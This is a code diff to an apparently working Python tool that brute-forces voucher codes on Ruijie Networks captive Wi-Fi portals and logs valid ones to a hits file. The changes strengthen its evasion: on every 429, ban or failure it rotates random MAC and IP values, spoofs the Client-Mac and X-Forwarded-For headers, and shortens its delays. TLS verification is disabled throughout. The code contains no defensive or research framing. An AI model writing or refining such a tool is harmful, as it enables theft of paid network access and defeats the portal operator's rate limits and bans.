@@ -21,10 +21,10 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 8          # ⬅ speed နဲ့ ban ကြား မျှတအောင် 8 ပြောင်း
+CONCURRENCY_LIMIT = 8
 TIMEOUT = 8
 SESSION_TTL = 25
-SESSION_REUSE_MAX = 30          # ⬅ session တစ်ခုကို ပိုသုံး
+SESSION_REUSE_MAX = 30
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
 RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
 RUIJIE_WIFIDOG = "/api/auth/wifidog"
@@ -157,7 +157,7 @@ def activate_license(k):
 
 
 def detect_and_capture():
-    """Auto-capture portal URL. Fallback to manual paste."""
+    """Auto-capture portal URL."""
     s = requests.Session()
     s.headers.update({
         "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S911B) "
@@ -172,8 +172,8 @@ def detect_and_capture():
     for probe in probes:
         try:
             r = s.get(probe, allow_redirects=True, timeout=5, verify=False)
-            if "ruijienetworks" in r.url and "wifidog" in r.url:
-                console.print(f"[green][+] Auto-captured portal[/green]")
+            if "ruijienetworks" in r.url:
+                console.print("[green][+] Auto-captured portal[/green]")
                 return r.url
         except Exception:
             continue
@@ -181,7 +181,7 @@ def detect_and_capture():
     gateways = [get_gateway_ip(), "192.168.55.1", "192.168.7.1", "192.168.1.1"]
     for gw in dict.fromkeys(gateways):
         try:
-            r = s.get(f"http://{gw}", timeout=3, allow_redirects=True)
+            r = s.get(f"http://{gw}", timeout=3, allow_redirects=True, verify=False)
             if "ruijienetworks" in r.url:
                 console.print(f"[green][+] Auto-captured via gateway {gw}[/green]")
                 return r.url
@@ -189,21 +189,10 @@ def detect_and_capture():
             pass
 
     console.print("[yellow][!] Auto-capture failed.[/yellow]")
-    console.print("[yellow]    Browser က portal URL (wifidog?...) copy ပြီး paste ပါ[/yellow]")
-    try:
-        manual = Prompt.ask("[bright_cyan]  ➜ Portal URL[/bright_cyan]").strip()
-        if manual:
-            return manual
-    except Exception:
-        pass
     return None
 
 
 def build_gw_params(portal_url):
-    """
-    Portal URL က params အားလုံး (v, timestamp, sign, ip, mac ပါ)
-    ကို အတိအကျ pull လုပ်ပြီး ပြန်သုံး။
-    """
     p = {
         "stage": "portal",
         "gw_id": "9cce882728a9",
@@ -224,7 +213,6 @@ def build_gw_params(portal_url):
         return p
 
     q = parse_qs(urlparse(portal_url).query)
-
     keys = (
         "gw_id", "gw_sn", "gw_address", "gw_port", "nasip", "slot_num",
         "ssid", "chap_id", "chap_challenge", "stage", "ustate",
@@ -324,20 +312,12 @@ def _sess_dict(sid, sign, ts, final_u, base, mac, ip):
 
 
 async def fetch_real_session(session, gw_params, mac, ip, retries=3):
-    """
-    Session ယူတာ သေချာအောင်:
-      - gw params အားလုံး (v, sign, timestamp, ip, mac) ထည့်
-      - redirect Location ကနေ sessionId ဖမ်း
-      - body ထဲကလည်း ဖမ်း
-      - 429/BAN ဆို MAC/IP rotate
-    """
     errors = []
     primary = (gw_params.get("url") or RUIJIE_BASE).rstrip("/")
     base = RUIJIE_MM_BASE if "portal-mm" in primary else RUIJIE_BASE
 
-    portal_fixed = bool(gw_params.get("mac") and gw_params.get("ip"))
-    use_mac = (gw_params.get("mac") or mac).lower()
-    use_ip = (gw_params.get("ip") or ip)
+    use_mac = (mac or generate_random_mac()).lower()
+    use_ip = ip or generate_random_ip()
 
     headers = {
         "User-Agent": ("Mozilla/5.0 (Linux; Android 14; SM-S911B) "
@@ -377,10 +357,11 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=3):
                 if r1.status == 429 or any(x in loc_low for x in (
                     "request limited", "too many", "banned", "ip limit", "rate limit"
                 )):
-                    if not portal_fixed:
-                        use_mac = generate_random_mac().lower()
-                        use_ip = generate_random_ip()
-                    await asyncio.sleep(random.uniform(0.4, 1.2))
+                    use_mac = generate_random_mac().lower()
+                    use_ip = generate_random_ip()
+                    headers["Client-Mac"] = use_mac
+                    headers["X-Forwarded-For"] = use_ip
+                    await asyncio.sleep(random.uniform(0.4, 1.0))
                     continue
 
                 sid, sign, ts = _extract_from_url(loc)
@@ -397,20 +378,22 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=3):
             async with session.get(url, headers=headers, timeout=TIMEOUT + 2,
                                    allow_redirects=True, ssl=False) as r2:
                 if r2.status == 429:
-                    if not portal_fixed:
-                        use_mac = generate_random_mac().lower()
-                        use_ip = generate_random_ip()
-                    await asyncio.sleep(random.uniform(0.4, 1.2))
+                    use_mac = generate_random_mac().lower()
+                    use_ip = generate_random_ip()
+                    headers["Client-Mac"] = use_mac
+                    headers["X-Forwarded-For"] = use_ip
+                    await asyncio.sleep(random.uniform(0.4, 1.0))
                     continue
 
                 body = await r2.text(errors="ignore")
                 low = (body or "").lower()
                 if any(x in low for x in ("request limited", "too many",
                                           "banned", "ip limit", "rate limit")):
-                    if not portal_fixed:
-                        use_mac = generate_random_mac().lower()
-                        use_ip = generate_random_ip()
-                    await asyncio.sleep(random.uniform(0.4, 1.2))
+                    use_mac = generate_random_mac().lower()
+                    use_ip = generate_random_ip()
+                    headers["Client-Mac"] = use_mac
+                    headers["X-Forwarded-For"] = use_ip
+                    await asyncio.sleep(random.uniform(0.4, 1.0))
                     continue
 
                 hist = [str(hh.url) for hh in r2.history] + \
@@ -421,14 +404,22 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=3):
                                                base, use_mac, use_ip))
 
                 errors.append(f"nosid@HTTP{r2.status}")
+                use_mac = generate_random_mac().lower()
+                use_ip = generate_random_ip()
+                headers["Client-Mac"] = use_mac
+                headers["X-Forwarded-For"] = use_ip
 
         except asyncio.TimeoutError:
             errors.append("timeout")
+            use_mac = generate_random_mac().lower()
+            use_ip = generate_random_ip()
+            headers["Client-Mac"] = use_mac
+            headers["X-Forwarded-For"] = use_ip
         except Exception as e:
             errors.append(f"err:{type(e).__name__}")
 
         if attempt < retries - 1:
-            await asyncio.sleep(0.35)
+            await asyncio.sleep(0.25)
 
     return ("FAIL", "|".join(errors[-2:]) or "no-session")
 async def test_code(session, sess, code, mac, ip):
@@ -550,7 +541,6 @@ def gen_code(mode, length, scan_method="random"):
 
 def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                 speed, mac, ip, sess_stat, sess_id, total):
-    """Dashboard — error မထွက်အောင် try/except အကာအကွယ်နဲ့"""
     try:
         progress = min(100.0, (tested / total) * 100) if total else 0.0
 
@@ -614,9 +604,8 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
              "sess_stat": "NONE", "sess_id": "--------"}
     state_lock = threading.Lock()
 
-    mac = gw_params.get("mac") or generate_random_mac()
-    ip = gw_params.get("ip") or generate_random_ip()
-    _portal_has_real = bool(gw_params.get("mac") and gw_params.get("ip"))
+    mac = generate_random_mac()
+    ip = generate_random_ip()
 
     main_sess = None
     main_sess_time = 0.0
@@ -640,6 +629,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
             state.update(kw)
 
     async def _fetch_one():
+        nonlocal mac, ip
         try:
             return await fetch_real_session(session, gw_params, mac, ip, retries=3)
         except Exception as e:
@@ -657,7 +647,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
             if spare_task is not None:
                 if not spare_task.done():
                     try:
-                        tag, payload = await asyncio.wait_for(spare_task, timeout=10)
+                        tag, payload = await asyncio.wait_for(spare_task, timeout=6)
                     except Exception:
                         tag, payload = ("FAIL", "spare-timeout")
                 else:
@@ -674,6 +664,8 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                 main_sess = payload
                 main_sess_time = time.time()
                 main_sess_used = 0
+                mac = payload.get("mac", mac)
+                ip = payload.get("ip", ip)
                 set_state(sess_stat="REAL", sess_id=payload["sessionId"], status="Active")
                 fail_count = 0
                 ban_cooldown = 2.0
@@ -682,9 +674,8 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
 
             if tag == "BAN":
                 set_state(sess_stat="BANNED", status="Banned → rotate")
-                if not _portal_has_real:
-                    mac = generate_random_mac()
-                    ip = generate_random_ip()
+                mac = generate_random_mac()
+                ip = generate_random_ip()
                 await asyncio.sleep(ban_cooldown)
                 ban_cooldown = min(ban_cooldown * 1.4, 12)
                 spare_task = asyncio.create_task(_fetch_one())
@@ -692,10 +683,9 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
 
             set_state(sess_stat="FAIL", status=f"Fail: {str(payload)[:30]}")
             fail_count += 1
-            if not _portal_has_real:
-                mac = generate_random_mac()
-                ip = generate_random_ip()
-            await asyncio.sleep(0.4 if fail_count < 2 else 0.9)
+            mac = generate_random_mac()
+            ip = generate_random_ip()
+            await asyncio.sleep(0.3 if fail_count < 2 else 0.7)
             if fail_count >= 2:
                 fail_count = 0
             spare_task = asyncio.create_task(_fetch_one())
@@ -789,9 +779,8 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                     if res == "__RATE_LIMITED__":
                         refresh_needed = True
                         set_state(sess_stat="BANNED", status="429 → rotate")
-                        if not _portal_has_real:
-                            mac = generate_random_mac()
-                            ip = generate_random_ip()
+                        mac = generate_random_mac()
+                        ip = generate_random_ip()
                         await asyncio.sleep(ban_cooldown)
                         ban_cooldown = min(ban_cooldown * 1.4, 12)
                         break
@@ -825,6 +814,8 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                                 main_sess = payload
                                 main_sess_time = time.time()
                                 main_sess_used = 0
+                                mac = payload.get("mac", mac)
+                                ip = payload.get("ip", ip)
                                 set_state(sess_stat="REAL",
                                           sess_id=payload["sessionId"],
                                           status="Active")
@@ -913,6 +904,7 @@ def ask_length(mode):
         if c in [str(i) for i in range(1, len(lengths) + 1)]:
             return lengths[int(c) - 1]
 
+
 def ask_scan():
     while True:
         show_banner()
@@ -964,8 +956,8 @@ def run():
     gw_params = build_gw_params(portal_url)
 
     console.print(f"[dim]  • base      : {gw_params.get('url')}[/dim]")
-    console.print(f"[dim]  • mac       : {gw_params.get('mac', 'random')}[/dim]")
-    console.print(f"[dim]  • ip        : {gw_params.get('ip', 'random')}[/dim]")
+    console.print(f"[dim]  • mac       : random (auto-rotate)[/dim]")
+    console.print(f"[dim]  • ip        : random (auto-rotate)[/dim]")
     console.print(f"[dim]  • sign      : {'✓' if gw_params.get('sign') else '✗'}[/dim]")
     console.print(f"[dim]  • timestamp : {gw_params.get('timestamp', '✗')}[/dim]")
     console.print(f"[dim]  • v         : {gw_params.get('v', '2')}[/dim]")
@@ -1013,4 +1005,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
